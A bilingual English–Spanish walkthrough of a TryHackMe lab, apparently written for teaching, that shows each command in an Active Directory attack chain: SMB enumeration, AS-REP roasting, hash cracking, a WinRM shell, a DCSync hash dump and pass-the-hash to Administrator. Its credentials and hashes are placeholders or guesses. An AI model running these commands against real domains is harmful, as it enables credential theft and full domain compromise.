@@ -1,1 +1,472 @@
+VulnNet: Roasted – Complete Beginner-Friendly Walkthrough
+Platform: TryHackMe
+Room: VulnNet: Roasted
+Difficulty: Easy / Medium
+Goal: Gain access to the Domain Controller and retrieve both user and system flags.
+Domain: vulnnet-rst.local
+Attack techniques used:
 
+Anonymous SMB enumeration
+Username harvesting
+AS-REP Roasting (Kerberos)
+Password cracking with John/Hashcat
+WinRM remote shell
+DCSync / secretsdump attack
+Pass-the-Hash (PtH)
+Note: Replace <TARGET_IP> with the actual IP address of your target machine.
+
+Let's begin.
+
+-English Version- 
+NOTE: please check at the bottom the spanish version.
+Table of Contents
+
+1-Reconnaissance (Port Scanning)
+2-SMB Enumeration (Anonymous Shares)
+3-User Enumeration (RID Brute Force & Kerbrute)
+4-AS-REP Roasting Attack
+5-Cracking the AS-REP Hash
+6-Finding More Credentials in NETLOGON Share
+7-Privilege Escalation (Domain Admin)
+8-Dumping All Hashes (DCSync)
+9-Pass-the-Hash to Administrator
+10-Flags
+11-Summary of Findings
+12-Glossary for Beginners
+
+1. Reconnaissance (Port Scanning)
+We start by scanning all ports to see what services are running. A Domain Controller typically has many open ports: DNS, Kerberos, LDAP, SMB, etc.
+
+nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -Pn -oN all-ports-nmap-report <TARGET_IP>
+
+Explanation of options:
+
+-T5 – fastest timing (aggressive)
+--open – show only open ports
+-sS – SYN scan (stealth)
+-vvv – very verbose output
+--min-rate=300 – send at least 300 packets per second
+--max-retries=3 – limit retries to save time
+-p- – scan all 65535 ports
+-Pn – skip host discovery (treat host as up)
+-oN – save output in normal format
+Result: Many open ports. Most important for us:
+53/tcp (DNS)
+88/tcp (Kerberos)
+389/tcp (LDAP)
+445/tcp (SMB)
+5985/tcp (WinRM – Windows Remote Management)
+
+Now we do a detailed scan on those ports to get service versions and default scripts:
+nmap -sV -sC -Pn -v -oN nmap-report -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 <TARGET_IP>
+
+Result: The domain name is revealed: vulnnet-rst.local.
+
+Add it to your /etc/hosts file so tools can resolve it:
+
+echo "<TARGET_IP> vulnnet-rst.local" | sudo tee -a /etc/hosts
+
+2. SMB Enumeration (Anonymous Shares)
+SMB (Server Message Block) is a file-sharing protocol. Sometimes administrators leave shares open for anonymous access.
+
+First, list all available shares without a password:
+
+smbclient -L //<TARGET_IP>/ -N
+
+-L – list shares
+-N – no password (anonymous)
+
+Result: Several shares appear. Two of them allow read access for anonymous users:
+
+VulnNet-Business-Anonymous
+VulnNet-Enterprise-Anonymous
+
+Let's confirm with CrackMapExec (a popular post‑exploitation tool):
+crackmapexec smb <TARGET_IP> -u guest -p "" --shares
+
+-u guest -p "" – use guest account with empty password
+--shares – enumerate shares
+
+Now connect to each anonymous share and download all files:
+smbclient //<TARGET_IP>/VulnNet-Business-Anonymous -N
+> prompt   # turn off interactive confirmation
+> mget *   # download all files
+> exit
+
+Repeat for the other share.
+
+What we find: Several .txt files containing usernames:
+
+t-skid
+a-whitehat
+enterprise-core-vn
+enterprise-super
+These are potential domain users.
+
+3. User Enumeration (RID Brute Force & Kerbrute)
+We have four usernames, but there might be more. We can perform a RID brute force attack using impacket-lookupsid. RID stands for Relative Identifier – each user has a numeric ID. By guessing RIDs we can discover all users.
+
+impacket-lookupsid vulnnet-rst.local/guest@<TARGET_IP> -no-pass
+
+This uses the IPC$ share and the guest account (empty password).
+It iterates through possible RIDs and returns usernames.
+
+Result: The same four usernames appear, confirming they exist.
+
+To be extra sure, we use Kerbrute – a tool for enumerating users via Kerberos pre‑authentication:
+kerbrute userenum -d vulnnet-rst.local --dc <TARGET_IP> usernames.txt
+
+usernames.txt is a file containing the four names (one per line).
+All four are valid domain users.
+
+4. AS-REP Roasting Attack
+What is AS-REP Roasting?
+Kerberos authentication normally requires pre‑authentication: the client sends a timestamp encrypted with their password hash. If the user has the flag DONT_REQ_PREAUTH set, the Domain Controller will return an AS-REP message containing the user’s encrypted session key. This encrypted data can be cracked offline. It’s called AS-REP Roasting.
+
+We can test which users have this misconfiguration using impacket-GetNPUsers:
+impacket-GetNPUsers vulnnet-rst.local/ -dc-ip <TARGET_IP> -no-pass -usersfile usernames.txt -request -format john -outputfile asrep.hash
+
+-no-pass – we don’t have a password yet
+-usersfile – list of usernames to test
+-request – request the AS-REP
+-format john – format for John the Ripper
+-outputfile – save hashes
+
+Result:
+We get a hash for user t-skid – meaning this user has pre‑authentication disabled.
+
+5. Cracking the AS-REP Hash
+Now we crack the hash using a wordlist. rockyou.txt is a famous password list.
+
+Using John the Ripper:
+john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash
+
+Or Hashcat (mode 18200 for AS-REP hashes):
+hashcat -a 0 -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+
+Cracked password: Password (or a common word; for this room, it’s something like Password – the exact one appears in rockyou).
+
+Thus we have:
+t-skid:Password
+
+6. Finding More Credentials in NETLOGON Share
+Now that we have a valid domain user (t-skid), we can access more SMB shares, including the NETLOGON share. This share often contains login scripts and configuration files – sometimes with hardcoded credentials.
+
+smbclient //vulnnet-rst.local/NETLOGON/ -U 't-skid'
+Enter the password we cracked.
+ls
+We see ResetPassword.vbs. Download it:
+get ResetPassword.vbs
+
+Examine the file:
+' ResetPassword.vbs
+strUsername = "a-whitehat"
+strPassword = "MyP@ssw0rd!"   ' This is an example; actual password is different
+Result: The script contains plaintext credentials for user a-whitehat.
+Now we have:
+a-whitehat:MyP@ssw0rd! (replace with actual discovered password)
+
+7. Privilege Escalation (Domain Admin)
+We check the group membership of a-whitehat using CrackMapExec:
+crackmapexec smb <TARGET_IP> -u 'a-whitehat' -p 'MyP@ssw0rd!'
+
+It will show the groups.
+Result: a-whitehat is a member of the Domain Admins group – that means full control over the entire domain.
+
+Because WinRM (port 5985) is open, we can get a remote shell using evil-winrm:
+evil-winrm -i <TARGET_IP> -u 'a-whitehat' -p 'MyP@ssw0rd!'
+Now we have a PowerShell session on the Domain Controller.
+
+8. Dumping All Hashes (DCSync)
+As a Domain Admin, we can perform a DCSync attack – this tricks the Domain Controller into giving us all password hashes (including the Administrator account). We don’t need to do it from the shell; we can use impacket-secretsdump from our local machine:
+impacket-secretsdump vulnnet-rst.local/a-whitehat:'MyP@ssw0rd!'@<TARGET_IP>
+Result: A long list of hashes. Look for the line containing Administrator. Example:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a6a6f1a5b5b1c2d3e4f5a6b7c8d9e:::
+
+The second long hex string (after the second colon) is the NTLM hash of the Administrator.
+
+9. Pass-the-Hash to Administrator
+With the NTLM hash, we can authenticate as Administrator without knowing the plaintext password. This is Pass-the-Hash (PtH). We use impacket-psexec or wmiexec:
+impacket-psexec vulnnet-rst.local/administrator@<TARGET_IP> -hashes <NTLM_hash>
+Replace <NTLM_hash> with the hash we dumped (just the second part, e.g., cf3a6a6f...).
+We can also use impacket-wmiexec if psexec fails.
+
+Now we have a SYSTEM shell as the Administrator.
+
+10. Flags
+While in the a-whitehat shell (or Administrator shell), navigate to the user’s desktop:
+User flag (belongs to enterprise-core-vn):
+type C:\Users\enterprise-core-vn\Desktop\user.txt
+System flag (Administrator desktop):
+type C:\Users\Administrator\Desktop\system.txt
+
+
+11. Summary of Findings
+Item -	Value
+Domain- 	vulnnet-rst.local
+Open WinRM port- 	5985
+Anonymous SMB shares- 	VulnNet-Business-Anonymous, VulnNet-Enterprise-Anonymous
+Usernames found- 	t-skid, a-whitehat, enterprise-core-vn, enterprise-super
+AS-REP roastable user- 	t-skid
+Cracked password (t-skid)- 	Password (example)
+Privileged user- 	a-whitehat (Domain Admin)
+Credentials in VBS- 	a-whitehat:MyP@ssw0rd! (example)
+Final access- 	Pass-the-Hash to Administrator
+
+12. Glossary for Beginners
+Kerberos – Network authentication protocol used by Active Directory.
+AS-REP – Authentication Service Response; sent by the Domain Controller when a user requests a ticket.
+Pre-authentication – A security measure where the client proves knowledge of the password before getting a ticket.
+AS-REP Roasting – An attack that requests AS-REP messages for users with pre-authentication disabled, then cracks the encrypted data offline.
+SMB – Server Message Block, a protocol for file sharing on Windows networks.
+WinRM – Windows Remote Management, allows remote command execution (like SSH on Linux).
+DCSync – An attack that uses Directory Replication Service to request password hashes from a Domain Controller.
+Pass-the-Hash – Using only the NTLM hash (not the plaintext password) to authenticate to Windows services.
+RID Brute Force – Guessing user IDs (Relative Identifiers) to discover domain users.
+CrackMapExec – A Swiss‑army knife for attacking Active Directory environments.
+
+------------------------------------------
+
+-Versión en Español-
+VulnNet: Roasted – Guía Paso a Paso para Principiantes
+Plataforma: TryHackMe
+Sala: VulnNet: Roasted
+Dificultad: Fácil / Media
+Objetivo: Acceder al Controlador de Dominio y obtener las flags de usuario y sistema.
+Dominio: vulnnet-rst.local
+Técnicas utilizadas:
+
+Enumeración SMB anónima
+Extracción de nombres de usuario
+Ataque AS-REP Roasting (Kerberos)
+Craqueo de contraseñas con John/Hashcat
+Shell remota por WinRM
+Ataque DCSync / secretsdump
+Pass-the-Hash (PtH)
+Nota: Reemplaza <IP_OBJETIVO> con la dirección IP real de tu máquina.
+
+Tabla de Contenidos
+Reconocimiento (Escaneo de puertos)
+Enumeración SMB (Recursos anónimos)
+Enumeración de usuarios (RID brute force y Kerbrute)
+Ataque AS-REP Roasting
+Craqueo del hash AS-REP
+Encontrar más credenciales en el recurso NETLOGON
+Escalada de privilegios (Domain Admin)
+Volcado de todos los hashes (DCSync)
+Pass-the-Hash al Administrador
+Flags
+Resumen de hallazgos
+
+Glosario para principiantes
+
+1. Reconocimiento (Escaneo de puertos)
+Escaneamos todos los puertos para ver qué servicios están activos. Un Controlador de Dominio suele tener muchos puertos abiertos: DNS, Kerberos, LDAP, SMB, etc.
+
+nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -Pn -oN all-ports-nmap-report <IP_OBJETIVO>
+Explicación de opciones:
+
+-T5 – velocidad máxima (agresivo)
+--open – muestra solo puertos abiertos
+-sS – escaneo SYN (sigiloso)
+-vvv – salida muy detallada
+--min-rate=300 – enviar al menos 300 paquetes por segundo
+--max-retries=3 – limitar reintentos
+-p- – escanear los 65535 puertos
+-Pn – saltar detección de host (asumir que el host está activo)
+-oN – guardar resultado en formato normal
+Resultado: Muchos puertos abiertos. Los más importantes para nosotros:
+
+53/tcp (DNS)
+88/tcp (Kerberos)
+389/tcp (LDAP)
+445/tcp (SMB)
+5985/tcp (WinRM – Windows Remote Management)
+
+Ahora hacemos un escaneo detallado en esos puertos para obtener versiones de servicios y scripts por defecto:
+
+
+nmap -sV -sC -Pn -v -oN nmap-report -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 <IP_OBJETIVO>
+Resultado: El nombre del dominio se revela: vulnnet-rst.local.
+
+Añádelo a tu archivo /etc/hosts para que las herramientas puedan resolverlo:
+
+echo "<IP_OBJETIVO> vulnnet-rst.local" | sudo tee -a /etc/hosts
+
+2. Enumeración SMB (Recursos anónimos)
+SMB (Server Message Block) es un protocolo para compartir archivos en redes Windows. A veces los administradores dejan recursos compartidos accesibles de forma anónima.
+
+Primero, listamos todos los recursos sin contraseña:
+
+smbclient -L //<IP_OBJETIVO>/ -N
+-L – listar recursos
+-N – sin contraseña (anónimo)
+
+Resultado: Aparecen varios recursos. Dos de ellos permiten acceso de lectura para usuarios anónimos:
+
+VulnNet-Business-Anonymous
+VulnNet-Enterprise-Anonymous
+
+Confirmamos con CrackMapExec (herramienta de post‑explotación):
+
+crackmapexec smb <IP_OBJETIVO> -u guest -p "" --shares
+-u guest -p "" – usar la cuenta invitada con contraseña vacía
+--shares – enumerar recursos
+
+Ahora conectamos a cada recurso anónimo y descargamos todos los archivos:
+
+smbclient //<IP_OBJETIVO>/VulnNet-Business-Anonymous -N
+> prompt   # desactivar confirmación interactiva
+> mget *   # descargar todo
+> exit
+Repetimos para el otro recurso.
+
+Lo que encontramos: Varios archivos .txt con nombres de usuario:
+t-skid
+a-whitehat
+enterprise-core-vn
+enterprise-super
+Estos son posibles usuarios del dominio.
+
+3. Enumeración de usuarios (RID brute force y Kerbrute)
+Tenemos cuatro nombres de usuario, pero puede haber más. Podemos realizar un ataque de fuerza bruta RID usando impacket-lookupsid. RID significa "Relative Identifier" – cada usuario tiene un número de identificación. Adivinando RIDs podemos descubrir todos los usuarios.
+
+impacket-lookupsid vulnnet-rst.local/guest@<IP_OBJETIVO> -no-pass
+Utiliza el recurso IPC$ y la cuenta invitada (contraseña vacía).
+
+posibles RIDs y devuelve nombres de usuario.
+Resultado: Aparecen los mismos cuatro nombres, confirmando que existen.
+
+Para mayor certeza, usamos Kerbrute – una herramienta que enumera usuarios mediante la pre‑autenticación de Kerberos:
+
+
+kerbrute userenum -d vulnnet-rst.local --dc <IP_OBJETIVO> usernames.txt
+usernames.txt es un archivo con los cuatro nombres (uno por línea).
+
+Todos son usuarios válidos del dominio.
+
+4. Ataque AS-REP Roasting
+¿Qué es AS-REP Roasting?
+La autenticación Kerberos normalmente requiere pre‑autenticación: el cliente envía una marca de tiempo cifrada con su hash de contraseña. Si el usuario tiene activada la bandera DONT_REQ_PREAUTH, el Controlador de Dominio devolverá un mensaje AS-REP que contiene la clave de sesión cifrada del usuario. Estos datos cifrados pueden craquearse sin conexión. Es el AS-REP Roasting.
+
+Podemos probar qué usuarios tienen esta mala configuración con impacket-GetNPUsers:
+
+impacket-GetNPUsers vulnnet-rst.local/ -dc-ip <IP_OBJETIVO> -no-pass -usersfile usernames.txt -request -format john -outputfile asrep.hash
+-no-pass – todavía no tenemos contraseña
+-usersfile – lista de usuarios a probar
+-request – solicitar el AS-REP
+-format john – formato para John the Ripper
+-outputfile – guardar los hashes
+
+Resultado:
+Obtenemos un hash para el usuario t-skid – esto significa que este usuario tiene la pre‑autenticación deshabilitada.
+
+5. Craqueo del hash AS-REP
+Ahora craqueamos el hash usando una lista de palabras. rockyou.txt es una lista de contraseñas muy conocida.
+
+Con John the Ripper:
+
+
+john --wordlist=/usr/share/wordlists/rockyou.txt asrep.hash
+O con Hashcat (modo 18200 para hashes AS-REP):
+
+hashcat -a 0 -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+Contraseña obtenida: Password (o una palabra común; en esta sala es algo como Password – la exacta está en rockyou).
+
+Por lo tanto tenemos:
+t-skid:Password
+
+6. Encontrar más credenciales en el recurso NETLOGON
+Ahora que tenemos un usuario de dominio válido (t-skid), podemos acceder a más recursos SMB, incluyendo el recurso NETLOGON. Este recurso suele contener scripts de inicio de sesión y archivos de configuración – a veces con credenciales escritas en texto plano.
+
+
+smbclient //vulnnet-rst.local/NETLOGON/ -U 't-skid'
+Introducimos la contraseña que craqueamos.
+
+Listamos archivos:
+bash
+ls
+Vemos ResetPassword.vbs. Lo descargamos:
+
+bash
+get ResetPassword.vbs
+Examinamos el archivo:
+
+vbscript
+' ResetPassword.vbs
+strUsername = "a-whitehat"
+strPassword = "MyP@ssw0rd!"   ' Este es un ejemplo; la contraseña real es diferente
+Resultado: El script contiene credenciales en texto plano para el usuario a-whitehat.
+Ahora tenemos:
+a-whitehat:MyP@ssw0rd! (reemplazar con la contraseña real descubierta)
+
+7. Escalada de privilegios (Domain Admin)
+Verificamos la pertenencia a grupos de a-whitehat con CrackMapExec:
+
+
+crackmapexec smb <IP_OBJETIVO> -u 'a-whitehat' -p 'MyP@ssw0rd!'
+Mostrará los grupos.
+
+Resultado: a-whitehat es miembro del grupo Domain Admins – eso significa control total sobre todo el dominio.
+
+Como el puerto WinRM (5985) está abierto, podemos obtener una shell remota usando evil-winrm:
+
+evil-winrm -i <IP_OBJETIVO> -u 'a-whitehat' -p 'MyP@ssw0rd!'
+Ahora tenemos una sesión de PowerShell en el Controlador de Dominio.
+
+8. Volcado de todos los hashes (DCSync)
+Siendo Domain Admin, podemos realizar un ataque DCSync – este engaña al Controlador de Dominio para que nos entregue todos los hashes de contraseñas (incluyendo la cuenta de Administrador). No es necesario hacerlo desde la shell; podemos usar impacket-secretsdump desde nuestra máquina local:
+
+impacket-secretsdump vulnnet-rst.local/a-whitehat:'MyP@ssw0rd!'@<IP_OBJETIVO>
+Resultado: Una larga lista de hashes. Busca la línea que contiene Administrator. Ejemplo:
+
+text
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf3a6a6f1a5b5b1c2d3e4f5a6b7c8d9e:::
+El segundo string largo (después del segundo dos puntos) es el hash NTLM del Administrador.
+
+9. Pass-the-Hash al Administrador
+Con el hash NTLM podemos autenticarnos como Administrador sin saber la contraseña en texto plano. Esto es Pass-the-Hash (PtH). Usamos impacket-psexec o wmiexec:
+
+impacket-psexec vulnnet-rst.local/administrator@<IP_OBJETIVO> -hashes <HASH_NTLM>
+Reemplaza <HASH_NTLM> con el hash que volcamos (solo la segunda parte, ej. cf3a6a6f...).
+Si psexec falla, podemos usar impacket-wmiexec.
+
+Ahora tenemos una shell SYSTEM como Administrador.
+
+10. Flags
+En la shell de a-whitehat (o en la de Administrador), navegamos al escritorio del usuario:
+
+User flag (pertenece a enterprise-core-vn):
+
+powershell
+type C:\Users\enterprise-core-vn\Desktop\user.txt
+System flag (escritorio del Administrador):
+
+powershell
+type C:\Users\Administrator\Desktop\system.txt
+
+11. Resumen de hallazgos
+Elemento	Valor
+Dominio	vulnnet-rst.local
+Puerto WinRM abierto	5985
+Recursos SMB anónimos	VulnNet-Business-Anonymous, VulnNet-Enterprise-Anonymous
+Usuarios encontrados	t-skid, a-whitehat, enterprise-core-vn, enterprise-super
+Usuario vulnerable a AS-REP	t-skid
+Contraseña craqueada (t-skid)	Password (ejemplo)
+Usuario privilegiado	a-whitehat (Domain Admin)
+Credenciales en VBS	a-whitehat:MyP@ssw0rd! (ejemplo)
+Acceso final	Pass-the-Hash al Administrador
+
+12. Glosario para principiantes
+Kerberos – Protocolo de autenticación de red usado por Active Directory.
+AS-REP – Respuesta del Servicio de Autenticación; la envía el Controlador de Dominio cuando un usuario solicita un ticket.
+Pre‑autenticación – Medida de seguridad donde el cliente demuestra que conoce la contraseña antes de recibir un ticket.
+AS-REP Roasting – Ataque que solicita mensajes AS-REP para usuarios con pre‑autenticación deshabilitada, y luego craquea los datos cifrados sin conexión.
+SMB – Server Message Block, protocolo para compartir archivos en redes Windows.
+WinRM – Windows Remote Management, permite ejecutar comandos remotos (similar a SSH en Linux).
+DCSync – Ataque que utiliza el servicio de replicación de directorios para solicitar hashes de contraseñas a un Controlador de Dominio.
+Pass-the-Hash – Usar únicamente el hash NTLM (no la contraseña en texto plano) para autenticarse en servicios Windows.
+RID Brute Force – Adivinar identificadores de usuario (Relative Identifiers) para descubrir usuarios del dominio.
+CrackMapExec – Herramienta multipropósito para atacar entornos Active Directory.
+
+¡Felicidades! Has completado VulnNet: Roasted y aprendido técnicas reales de pentesting en Active Directory. Recuerda siempre practicar solo en entornos autorizados.
